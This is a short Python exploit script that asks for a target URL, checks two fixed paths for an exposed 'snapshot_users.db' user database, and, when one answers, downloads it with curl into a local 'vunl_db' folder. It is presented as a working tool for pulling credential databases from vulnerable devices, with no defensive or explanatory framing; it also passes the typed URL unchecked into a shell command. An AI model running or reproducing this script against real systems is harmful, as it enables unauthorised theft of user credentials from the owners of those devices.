import requests,os

def check_file_exists(url):
    try:
        response = requests.head(url, allow_redirects=True)
        # Check if status code is 200, indicating the file exists
        if response.status_code == 200:
            print("File exists at the specified URL.")
            return True
        elif response.status_code == 404:
            print("File does not exist.")
            return False
        else:
            print(f"Received status code {response.status_code}; check manually.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

# URL to check
target = str(input("Enter the target url ex(http://192.168.1.2:80/) : "))
url = f"{target}logs/devcfg/snapshot/snapshot_users.db"
#print(url)
vunl = check_file_exists(url)
if vunl:
   os.system(f"curl {url} --output ./vunl_db/{target.replace(':','_').replace('https://','').replace('http://','').replace('/','')}_userss.db")
else:
   url2 = f"{target}logs/devcfg/user/snapshot_users.db"
#   print(url2)
   vunl = check_file_exists(url2)
   if vunl:
       os.system(f"curl {url2} --output ./vunl_db/{target.replace(':','_').replace('https://','').replace('http://','').replace('/','')}_userss.db")
   else:
     print("not vunl")


